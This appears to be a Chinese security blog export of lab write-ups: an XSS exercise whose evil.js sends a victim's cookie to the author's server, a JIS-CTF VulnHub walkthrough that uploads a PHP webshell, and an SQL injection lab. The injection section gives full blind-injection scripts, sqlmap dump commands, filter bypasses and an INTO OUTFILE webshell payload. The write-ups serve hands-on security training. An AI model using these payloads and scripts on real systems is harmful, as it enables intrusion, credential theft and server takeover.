注意到由location.hash，看下这个属性的定义 hash 属性是一个可读可写的字符串，该字符串是 URL 的锚部分（从 # 号开始的部分）。 看来是将#后面的字符显示在屏幕上，而且里面已经有script标签了。 尝试闭合一下write里的)试试 DOM型XSS，#后面输入payload即可： 1http://192.168.200.106/xss/example9.php#&lt;script&gt;alert(‘flag‘)&lt;/script&gt; 2、JS实战在第一部分我们已经攻下了靶机的XSS关，那么XSS有什么用呢？仅仅是弹框吗？我们用所学的JS来获取一些有用信息。 为了方便，所以就拿刚刚靶场的第一关来做测试 (1)盗取cookie 首先在自己的主机上/3/html文件下搭建一个js文件evil.js 123var a = document.createElement(\"a\"); //创建一个对象a.src=\"http://192.168.43.244/3/html/log?\"+escape(document.cookie); //对象的源地址document.body.appendChild(img);//把对象加入为网页的body的子控件 因为靶机网页里没有cookie所以用google的EditThisCookie给靶机加了个cookie: user:hacer 现在只需要在靶机网页上访问我的evil.js就能在我的web服务器日志中看到请求。可用如下方式访问 1&lt;script src=\"http://192.168.43.244/3/html/evil.js\"&gt; &lt;/script&gt; 网页中为： 1http://192.168.43.146/xss/example1.php?name=%3Cscript%20src=%22http://192.168.43.244/3/html/evil.js%22%3E%3C/script%3E 然后在自己的apache服务器下的/var/log/apache2找到日志 1192.168.43.244 - - [02/Jun/2018:19:40:17 +0800] \"GET /3/html/log?user%3Dhacer HTTP/1.1\" 404 208 可以看到cookie已经成功显示： user%3dhacer 即user:hacer (2)基本语法测试 改一下evil.js。 123document.write('host:'+location.hostname+\"&lt;/br&gt;\");document.write('path:'+location.pathname+\"&lt;/br&gt;\");document.write('port:'+location.port+\"&lt;/br&gt;\"); 访问,屏幕显示： 123Hello host:192.168.43.146 path:/xss/example1.phpport: 再改一下evil.js 12window.open(\"http://www.baidu.com\");window.closed=\"true\"; 这样就会打开另外一个网页并关闭原来的网页。 123456789101112downloadFile(\"https://pentesterlab.com/exercises/linux_host_review/iso\");function downloadFile(url) &#123; try&#123; var elemIF = document.createElement(\"iframe\"); elemIF.src = url; elemIF.style.display = \"none\"; document.body.appendChild(elemIF); &#125;catch(e)&#123; zzrw.alert(\"下载异常！\"); &#125; &#125; 这样就会下载一个文档。 因为XSS也是入门所以更多的练习将会在以后开展。 3、JS代码阅读看一下dvwa的dvwaPage.js代码： 12345678910111213141516171819202122232425262728293031323334/* Help popup */function popUp(URL) &#123; day = new Date(); id = day.getTime(); eval(\"page\" + id + \" = window.open(URL, '\" + id + \"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');\");&#125;/* Form validation */function validate_required(field,alerttxt)&#123;with (field) &#123; if (value==null||value==\"\") &#123; alert(alerttxt);return false; &#125; else &#123; return true; &#125; &#125;&#125;function validate_form(thisform) &#123;with (thisform) &#123; // Guestbook form if (validate_required(txtName,\"Name can not be empty.\")==false) &#123;txtName.focus();return false;&#125; if (validate_required(mtxMessage,\"Message can not be empty.\")==false) &#123;mtxMessage.focus();return false;&#125; &#125;&#125; 主要是三个函数 先看第一个函数： 12345 function popUp(URL) &#123; day = new Date(); id = day.getTime(); eval(\"page\" + id + \" = window.open(URL, '\" + id + \"', 'toolbar=0,scrollbars=1,location=0,statusbar=0,menubar=0,resizable=1,width=500,height=300,left = 540,top = 250');\");&#125; 传入参数是URL,意思传入一个网页 首先根据new Date()获取今天的日期并赋值给一个day变量。 再调用day变量中的getTime()方法获取时间并赋值给id变量。 再调用eval函数执行里面的代码。里面的代码为打开一个新窗口，并制定窗口风格大小等，并把这个窗口的句柄赋值给页面的id。 接着看第二个函数： 1234567891011function validate_required(field,alerttxt)&#123;with (field) &#123; if (value==null||value==\"\") &#123; alert(alerttxt);return false; &#125; else &#123; return true; &#125; &#125;&#125; 函数的主要功能是验证输入值是否为空。 函数传入两个参数field和alerttxt，返回值为布尔类型。 然后验证field的value变量是否为空，是的话弹出alertxt的内容返回false。 否则的话返回true. 再看第三个函数： 1234567891011function validate_form(thisform) &#123;with (thisform) &#123; // Guestbook form if (validate_required(txtName,\"Name can not be empty.\")==false) &#123;txtName.focus();return false;&#125; if (validate_required(mtxMessage,\"Message can not be empty.\")==false) &#123;mtxMessage.focus();return false;&#125; &#125;&#125; 函数的主要功能使验证提交的表单。 输入参数为thisform，返回值为布尔类型。 逻辑是先调用validate_required()函数判断thisform.txtName是否为空，为空则把光标放在txtName输入框，返回false。 不为空再调用validate_required()函数判断thisform.mtxMessage是否为空,为空则把光标放在mtxMessage输入框，返回false。不为空返回true。","categories":[{"name":"web安全","slug":"web","permalink":"http://blog.ydq6.com/categories/web/"}],"tags":[{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"},{"name":"js","slug":"js","permalink":"http://blog.ydq6.com/tags/js/"}]},{"title":"JIS-CTF靶机测试","slug":"JIS-CTF靶机测试","date":"2020-05-06T14:54:59.000Z","updated":"2020-05-06T15:16:00.266Z","comments":true,"path":"渗透测试/JIS-CTF靶机测试/","link":"","permalink":"http://blog.ydq6.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/","excerpt":"JIS-CTF 靶机测试​ 一、环境搭建从下面网站下载ova文件并导入到virtual box中。 https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/","text":"JIS-CTF 靶机测试​ 一、环境搭建从下面网站下载ova文件并导入到virtual box中。 https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/ 二、找flag（1）ip探测首先探测靶机的IP地址 netdiscover -i eth0 发现mac地址08:00:27:68:18:58对应的ip地址为192.168.1.118 （2）端口扫描扫描下端口、服务和操作系统 nmap -sV -O 192.168.1.118 结果: 123456789101112PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))MAC Address: 08:00:27:68:18:58 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.8Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . 只开了ssh端口和http端口，且是apache服务器，Ubuntu系统 （3）扫描下常见漏洞： nmap –script=vuln 192.168.1.118 12345678910111213141516171819202122232425262728293031323334353637Host is up (0.00060s latency).Not shown: 998 closed portsPORT STATE SERVICE22/tcp open ssh80/tcp open http| http-csrf:| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.118| Found the following possible CSRF vulnerabilities:|| Path: http://192.168.1.118:80/| Form id:|_ Form action: check_login.php|_http-dombased-xss: Couldn't find any DOM based XSS.| http-enum:| /admin_area/: Possible admin folder| /login.php: Possible admin folder| /admin_area/index.php: Possible admin folder| /robots.txt: Robots file| /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'|_ /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'| http-slowloris-check:| VULNERABLE:| Slowloris DOS attack| State: LIKELY VULNERABLE| IDs: CVE:CVE-2007-6750| Slowloris tries to keep many connections to the target web server open and hold| them open as long as possible. It accomplishes this by opening connections to| the target web server and sending a partial request. By doing so, it starves| the http server's resources causing Denial Of Service.|| Disclosure date: 2009-09-17| References:| https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750|_ http://ha.ckers.org/slowloris/|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)MAC Address: 08:00:27:68:18:58 (Oracle VirtualBox virtual NIC) （4）找第一个flag有robots敏感目录 robots.txt文件： 123456789User-agent: *Disallow: /Disallow: /backupDisallow: /adminDisallow: /admin_areaDisallow: /r00tDisallow: /uploadsDisallow: /uploaded_filesDisallow: /flag flag敏感目录很明显，进入拿到第一个flag The 1st flag is : {8734509128730458630012095} （5）找第二个flag再查找其他隐藏目录，一个个的翻，终于在 admin_area/index.php下找到。 在第一遍查看时我直接看到这个就跳过了，然后找半天没有办法再一个个仔细看，在这个源代码中发现了第二个flag. 源代码： 12345678910111213&lt;html&gt;&lt;head&gt;&lt;title&gt;Fake admin area :)&lt;/title&gt;&lt;body&gt;&lt;center&gt;&lt;h1&gt;The admin area not work :) &lt;/h1&gt;&lt;/center&gt;&lt;!-- username : admin password : 3v1l_H@ck3r The 2nd flag is : &#123;7412574125871236547895214&#125;--&gt;&lt;/body&gt;&lt;/html&gt; The 2nd flag is : {7412574125871236547895214} 而且账户名是admin 密码是3v1l_H@ck3r （6）找第三个flag在主页面输入账号密码登录进来 看来是个文件上传，试一下。 上传个php文件一句话木马 1&lt;?php @eval($_POST[cmd])?&gt; 左上角显示SUCCESS，看来没什么过滤。 不知道上传到哪了，找一下先前禁止的目录中的/uploaded_files和/uploads 在/uploaded_files/yijuhua.php发现上传的一句话木马，用菜刀连接试试。不知道为什么连不上。换个大马上传下试试。上传小朋友大马再登录 1http://192.168.1.118/uploaded_files/xiaopengyou.php 成功连接上 在根目录下发现文件hint.txt. 里面有第三个flag 1The 3rd flag is : &#123;7645110034526579012345670&#125; 还有提示： 1try to find user technawi password to read the flag.txt file, you can find it in a hidden file ;) 而且里面还有flag.txt，发现没有权限。看上面的权限需要找到用户technawi的密码，而且提示在一个隐藏文件中。 （7）找第四个flag下一关应该是相当难的，先在大马中反弹shell到自己端口上，然后利用shell进行操作。我找遍了网站下所有文件都没发现含有technawi密码的隐藏文件，因为它说是hidden file，我理解的是隐藏文件，所以一直在用ls查找。找不到了于是在全局找technawi，找半天也没找到对的，因为太多包含technawi的了。最后机智的想到是不是该找下一个flag了，按以前文件的格式应该是the 4th flag is,于是利用 grep “the 4th flag” #注意时间会比价慢 终于在/etc/mysql/conf.d/credentials.txt文件中找出第四个flag 1234The 4th flag is : &#123;7845658974123568974185412&#125;username : technawipassword : 3vilH@ksor The 4th flag is : {7845658974123568974185412} （7）找第五个flag因为先前查找时已经发现flag.txt属于technawi用户，证明可以用technawi登录ssh，于是 ssh technawi@192.168.1.118 然后vim /var/www/html/flag.txt发现第五个flag technawi The 5th flag is : {5473215946785213456975249} Good job :) You find 5 flags and got their points and finish the first scenario…. 到此五个flag全部找出。 [注]后来去网上寻找才发现直接用 find / -user technawi 2&gt;/dev/null 寻找更快","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://blog.ydq6.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"http://blog.ydq6.com/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"web","slug":"web","permalink":"http://blog.ydq6.com/tags/web/"}]},{"title":"合天培训_实验_sql注入","slug":"合天培训_实验_sql注入","date":"2020-05-01T09:00:13.000Z","updated":"2020-05-01T12:53:46.701Z","comments":true,"path":"web/合天培训_实验_sql注入/","link":"","permalink":"http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_sql%E6%B3%A8%E5%85%A5/","excerpt":"本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。","text":"本文主要描述了SQL注入的几种类型，以及使用sqlmap如何对这几种类型进行注入。 1.数字型注入直接用sqlmap 12345678sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 –dbs #列数据库信息sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 --current-db 查看当前使用的数据库sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab --tables #查看数据库下的表名sqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columnssqlmap -u http://47.105.75.177/vulnlab/sqli/index.php?id=1 -D hetianlab -T user --columns --dump 手工注入： 1234567-1 union select 1,2,3-1 union select 1,2,database()-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()-1%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27user%27-1%20union%20select%201,username,password%20from%20user 得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3 2.字符型注入12' 报错'%23 正确 猜测为字符型注入。 爆库 1234567-1' union select 1,2,3 %23-1' union select 1,2,database() %23-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23-1'%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27user%27 %23-1'%20union%20select%201,username,password%20from%20user %23 得到账户名：admin 密码： 21232f297a57a5a743894a0e4a801fc3 3.布尔盲注（1）判断类型 121' 不显示结果1%27%23 正确 you are in 根据方法判断是盲注 根据http response看出是布尔型 （2）列数 11' order by 5 % 23 二分爆出列数3 （3）脚本爆表： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#-*- coding:utf-8 -*-import requestsimport stringurl=\"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\"target_url=\"&#123;url&#125;' and &#123;payload&#125;%23\"string_set = string.printable+',_'#判断条件可以选择length,substr,regexp,left等函数value_statement='(select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;) 'length_statement='(select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;) 'MAX_LEN = 10000ASCII_MAX = 128TRUE_FLAG=\"You are in\"import threadingclass MyThread(threading.Thread): def __init__(self,begin,end,column_name,table_name,where_statement): threading.Thread.__init__(self) self.begin = begin self.end = end self.value = '' self.column_name = column_name self.table_name = table_name self.where_statement = where_statement def run(self): value = \"\" for cur_index in range(self.begin,self.end+1): begin = 0 end = ASCII_MAX while begin &lt;= end: mid = (begin+end)//2 payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='=',ascii_number=mid) if selectIsTrue(payload): begin = mid break payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='&gt;',ascii_number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 value += chr(begin) #print(\"value:%s\"%value) self.value = value def get_result(self): return self.valuedef selectIsTrue(payload): #print(\"url:\"+target_url.format(url=url,payload=payload)) content = requests.get(target_url.format(url=url,payload=payload)).content.decode(\"utf-8\") if TRUE_FLAG in content: return True else: return Falsedef get_len(column_name,table_name,where_statement): begin=0 end=MAX_LEN while begin &lt;= end: mid = (begin+end)//2 payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='=',number=mid) if selectIsTrue(payload): begin = mid break payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='&gt;',number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 length = begin return lengthThread_Nums=10def get_value(column_name,table_name,where_statement,length): value = '' thread_lists = [] task_num = length//Thread_Nums if length &gt;= Thread_Nums: for i in range(1,length+1,task_num): cur_thread = MyThread(i,i+task_num-1,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() else: cur_thread = MyThread(1,length,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() for cur_thread in thread_lists: cur_thread.join() value += cur_thread.get_result() return valuedef main(): column_name=\"group_concat(table_name)\" table_name=\"information_schema.tables\" where_statement=\"table_schema=database()\" #判断表长度 all_table_name_len = get_len(column_name,table_name,where_statement) print(\"all_table_name_len:%s\"%all_table_name_len) #找表名 all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len) print(\"all_table_name:%s\"%all_table_name) #comment,comments,emails,referers,string,user,user #判断列长度 column_name=\"group_concat(column_name)\" table_name=\"information_schema.columns\" t_name = input(\"输入要查询的表名\\n\") where_statement=\"table_schema=database() and table_name='&#123;t_name&#125;'\".format(t_name=t_name) all_column_name_len = get_len(column_name,table_name,where_statement) print(\"all_column_name_len:%s\"%all_column_name_len) all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len) print(\"all_column_name:%s\"%all_column_name) c_names = input(\"输入所有要查询的字段,以逗号分开\\n\").split(',') for c_name in c_names: column_name=\"group_concat(&#123;column_name&#125;)\".format(column_name=c_name) table_name=t_name where_statement = \"1\" all_value_len = get_len(column_name,table_name,where_statement) print(\"%s_length:%s\"%(c_name,all_value_len)) all_value = get_value(column_name,table_name,where_statement,all_value_len) print(\"%s_value:%s\"%(c_name,all_value))if __name__ == \"__main__\": main() username:admin password:21232f297a57a5a743894a0e4a801fc3 或者直接sqlmap 1234python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B --dbspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B -D hetianlab --tablespython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B -D hetianlab -T user --columnspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index2.php?id=1\" -technique B -D hetianlab -T user --dump 4.时间盲注尝试 1id=1' and sleep(3) %23 //where 语句里面可以用sleep函数。 发现时间延长。 所以可以直接用脚本爆破： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127#-*- coding:utf-8 -*-import requestsimport stringurl=\"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\"target_url=\"&#123;url&#125;' and &#123;payload&#125;%23\"string_set = string.printable+',_'#判断条件可以选择length,substr,regexp,left等函数Sleep_Function=\"sleep(3)\"value_statement='if ((select (select ascii(substr(&#123;column_name&#125;,&#123;index&#125;,1)) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;ascii_number&#125;),'+Sleep_Function+\",1)\"length_statement='if ((select (select length(&#123;column_name&#125;) from &#123;table_name&#125; where &#123;where_statement&#125;) &#123;symbol&#125; &#123;number&#125;),' + Sleep_Function+',1)'MAX_LEN = 10000ASCII_MAX = 128import threadingclass MyThread(threading.Thread): def __init__(self,begin,end,column_name,table_name,where_statement): threading.Thread.__init__(self) self.begin = begin self.end = end self.value = '' self.column_name = column_name self.table_name = table_name self.where_statement = where_statement def run(self): value = \"\" for cur_index in range(self.begin,self.end+1): begin = 0 end = ASCII_MAX while begin &lt;= end: mid = (begin+end)//2 payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='=',ascii_number=mid) if selectIsTrue(payload): begin = mid break payload=value_statement.format(column_name=self.column_name,index=cur_index,table_name=self.table_name,where_statement=self.where_statement,symbol='&gt;',ascii_number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 value += chr(begin) #print(\"value:%s\"%value) self.value = value def get_result(self): return self.valuedef selectIsTrue(payload): #print(\"url:\"+target_url.format(url=url,payload=payload)) try: content = requests.get(target_url.format(url=url,payload=payload),timeout=1).content except: return True return Falsedef get_len(column_name,table_name,where_statement): begin=0 end=MAX_LEN while begin &lt;= end: mid = (begin+end)//2 payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='=',number=mid) if selectIsTrue(payload): begin = mid break payload=length_statement.format(column_name=column_name,table_name=table_name,where_statement=where_statement,symbol='&gt;',number=mid) if selectIsTrue(payload): begin = mid + 1 else: end = mid - 1 length = begin return lengthThread_Nums=10def get_value(column_name,table_name,where_statement,length): value = '' thread_lists = [] task_num = length//Thread_Nums if length &gt;= Thread_Nums: for i in range(1,length+1,task_num): cur_thread = MyThread(i,i+task_num-1,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() else: cur_thread = MyThread(1,length,column_name,table_name,where_statement) thread_lists.append(cur_thread) cur_thread.start() for cur_thread in thread_lists: cur_thread.join() value += cur_thread.get_result() return valuedef main(): column_name=\"group_concat(table_name)\" table_name=\"information_schema.tables\" where_statement=\"table_schema=database()\" #判断表长度 all_table_name_len = get_len(column_name,table_name,where_statement) print(\"all_table_name_len:%s\"%all_table_name_len) #找表名 all_table_name = get_value(column_name,table_name,where_statement,all_table_name_len) print(\"all_table_name:%s\"%all_table_name) #comment,comments,emails,referers,string,user,user #判断列长度 column_name=\"group_concat(column_name)\" table_name=\"information_schema.columns\" t_name = input(\"输入要查询的表名\\n\") where_statement=\"table_schema=database() and table_name='&#123;t_name&#125;'\".format(t_name=t_name) all_column_name_len = get_len(column_name,table_name,where_statement) print(\"all_column_name_len:%s\"%all_column_name_len) all_column_name = get_value(column_name,table_name,where_statement,all_column_name_len) print(\"all_column_name:%s\"%all_column_name) c_names = input(\"输入所有要查询的字段,以逗号分开\\n\").split(',') for c_name in c_names: column_name=\"group_concat(&#123;column_name&#125;)\".format(column_name=c_name) table_name=t_name where_statement = \"1\" all_value_len = get_len(column_name,table_name,where_statement) print(\"%s_length:%s\"%(c_name,all_value_len)) all_value = get_value(column_name,table_name,where_statement,all_value_len) print(\"%s_value:%s\"%(c_name,all_value))if __name__ == \"__main__\": main() username:admin password:21232f297a57a5a743894a0e4a801fc3 或者直接sqlmap 1234python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T --dbspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T -D hetianlab --tablespython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T -D hetianlab -T user --columnspython sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1\" -technique T -D hetianlab -T user --dump 宽字符注入输入单引号被斜杠转义，想方法把斜杠去掉，提示宽字符所以用gbk编码。第一个字节采用大于128的编码即可。 1id=1%9c%27 %23 成功绕过。直接查表 1id=-1%9c%27 union select 1,username,password from user %23 用户名： admin 密码： 21232f297a57a5a743894a0e4a801fc3 或者sqlmap: 1python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index3.php?id=1%9c%27\" -D hetianlab -T user --dump 绕过select过滤尝试union%20select%201,2,3,发现select 被过滤了。 尝试重写绕过union seselectlect 1,2,3成功。或者大小写绕过也成功union Select 1,2,3成功。 过滤语句应该是进行简单的替换。 1id = 1 union%20Select%201,username,password%20from%20user 账户名： admin ，密码： 21232f297a57a5a743894a0e4a801fc3 或者sqlmap: 1python sqlmap.py -u \"http://47.105.75.177/vulnlab/sqli/index5.php?id=1\" --tamper \"nonrecursivereplacement.py\" 进阶之真实案例随便浏览发现可能注入点： 1http://47.105.75.177/vulnlab/sqli/beecms/product/product.php?id=5 多番尝试后发现注不出来。 dirsearch扫描。 123456789101112131415161718192021222324252627282930313233python .\\dirsearch.py -u http://47.105.75.177/vulnlab/sqli/beecms -e php[12:34:56] 301 - 255B - /vulnlab/sqli/beecms/admin -&gt; http://47.105.75.177/vulnlab/sqli/beecms/admin/[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/ -&gt; login.php[12:34:57] 403 - 237B - /vulnlab/sqli/beecms/admin/.htaccess[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/?/login -&gt; login.php[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/admin.php -&gt; login.php[12:34:57] 302 - 0B - /vulnlab/sqli/beecms/admin/index.php -&gt; login.php[12:34:58] 200 - 2KB - /vulnlab/sqli/beecms/admin/login.php[12:34:58] 302 - 0B - /vulnlab/sqli/beecms/admin/upload.php -&gt; login.php[12:35:02] 301 - 257B - /vulnlab/sqli/beecms/article -&gt; http://47.105.75.177/vulnlab/sqli/beecms/article/[12:35:04] 301 - 254B - /vulnlab/sqli/beecms/book -&gt; http://47.105.75.177/vulnlab/sqli/beecms/book/[12:35:05] 301 - 258B - /vulnlab/sqli/beecms/ckeditor -&gt; http://47.105.75.177/vulnlab/sqli/beecms/ckeditor/[12:35:05] 200 - 0B - /vulnlab/sqli/beecms/ckeditor/[12:35:07] 301 - 254B - /vulnlab/sqli/beecms/data -&gt; http://47.105.75.177/vulnlab/sqli/beecms/data/[12:35:08] 301 - 254B - /vulnlab/sqli/beecms/down -&gt; http://47.105.75.177/vulnlab/sqli/beecms/down/[12:35:11] 301 - 258B - /vulnlab/sqli/beecms/includes -&gt; http://47.105.75.177/vulnlab/sqli/beecms/includes/[12:35:11] 200 - 0B - /vulnlab/sqli/beecms/includes/[12:35:11] 200 - 18KB - /vulnlab/sqli/beecms/index.php[12:35:12] 200 - 18KB - /vulnlab/sqli/beecms/index.php/login/[12:35:12] 301 - 257B - /vulnlab/sqli/beecms/install -&gt; http://47.105.75.177/vulnlab/sqli/beecms/install/[12:35:12] 200 - 89B - /vulnlab/sqli/beecms/install/[12:35:13] 301 - 259B - /vulnlab/sqli/beecms/languages -&gt; http://47.105.75.177/vulnlab/sqli/beecms/languages/[12:35:14] 301 - 256B - /vulnlab/sqli/beecms/member -&gt; http://47.105.75.177/vulnlab/sqli/beecms/member/[12:35:14] 200 - 0B - /vulnlab/sqli/beecms/member/[12:35:19] 301 - 257B - /vulnlab/sqli/beecms/product -&gt; http://47.105.75.177/vulnlab/sqli/beecms/product/[12:35:20] 200 - 140B - /vulnlab/sqli/beecms/robots.txt[12:35:20] 301 - 256B - /vulnlab/sqli/beecms/search -&gt; http://47.105.75.177/vulnlab/sqli/beecms/search/[12:35:21] 301 - 257B - /vulnlab/sqli/beecms/sitemap -&gt; http://47.105.75.177/vulnlab/sqli/beecms/sitemap/[12:35:23] 301 - 258B - /vulnlab/sqli/beecms/template -&gt; http://47.105.75.177/vulnlab/sqli/beecms/template/[12:35:23] 200 - 0B - /vulnlab/sqli/beecms/template/[12:35:24] 301 - 256B - /vulnlab/sqli/beecms/upload -&gt; http://47.105.75.177/vulnlab/sqli/beecms/upload/ 发现后台地址： 1http://47.105.75.177/vulnlab/sqli/beecms/admin/ 尝试sql注入: 12用户名：admin' or 1密码：123 报错: 12You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' limit 0,1' at line 1sql:select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='admin' or 1' limit 0,1 现在直接构造payload注入： 12用户名：admin' and '1密码：123 提示不存在用户。尝试另外种思路： 12用户名：admi' union select 1,2,'pwd',4,5 #密码： pwd 报错： 1select id,admin_name,admin_password,admin_purview,is_disable from bees_admin where admin_name='admi' 1,2,'pwd',4,5 #' limit 0,1 发现union 和select被过滤了。 尝试绕过方法： 123（1）UnunionIon 显示UnunionIon（2）Union 显示空（2）Un union ion 显示union 成功绕过。 重新构造payload: 12用户名：admi' Un union ion Se select lect 1,2,'pwd',4,5 #密码： pwd 发现select函数有问题了， 尝试绕过方法： 1Se%select%lect 显示select 再构造payload: 12用户名：admi' Un union ion Se%select%lect 1,2,'pwd',4,5 #密码： pwd 说密码正确，猜想密码是密文保存的。用md5。 12用户名：admi' Un union ion Se%select%lect 1,2,'9003d1df22eb4d3820015070385194c8',4,5 #密码：pwd 注入成功，提示该账号被锁定，无法登录。 发现字段is_disable被设置成5所以不能登录，改下payload: 12用户名：admi' Un union ion Se%select%lect 1,'admin','9003d1df22eb4d3820015070385194c8',4,0 #密码：pwd 成功登录。 尝试文件注入： 首先绕过Into，outfile关键词，用I into nto, O%outfile%utfile替换 1用户名： admi' Un union ion Se%select%lect 1,'&lt;?php @eval($_POST[x]);?&gt;',3,4,5 I into nto O%outfile%utfile 'shell.php' # test: 1admi' Un union ion Se%select%lect 1,'&lt;?php echo 1;?&gt;',3,4,5 I into nto O%outfile%utfile '../upload/shell1.php' # 报错: 1操作数据库失败Can't create/write to file '/var/lib/mysql/upload/shell1.php' 猜测路径：/var/www/html/vulnlab/sqli/beecms/upload/ 构造payload上传即可。 1admi' Un union ion Se%select%lect 1,'&lt;?php @eval($_POST[x]);?&gt;',3,4,5 I into nto O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/shell.php' # 测试下： 1admi' Un union ion Se%select%lect 1,'&lt;?php echo 1?&gt;',3,4,5 I into nto O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/1.php' # 发现内容为： 1&amp;lt;?php echo 1;?&amp;gt; 3 4 5 所有特殊字符被转义了。所以利用胖白老大讲的char函数。 利用hackbar生成 1CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 71, 69, 84, 91, 120, 93, 41, 59, 63, 62) 所以payload为 1admi' Un union ion Se%select%lect 1,CHAR(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 120, 93, 41, 59, 63, 62),3,4,5 I into nto O%outfile%utfile '/var/www/html/vulnlab/sqli/beecms/upload/shell2.php' # 然后用菜刀连接即可。 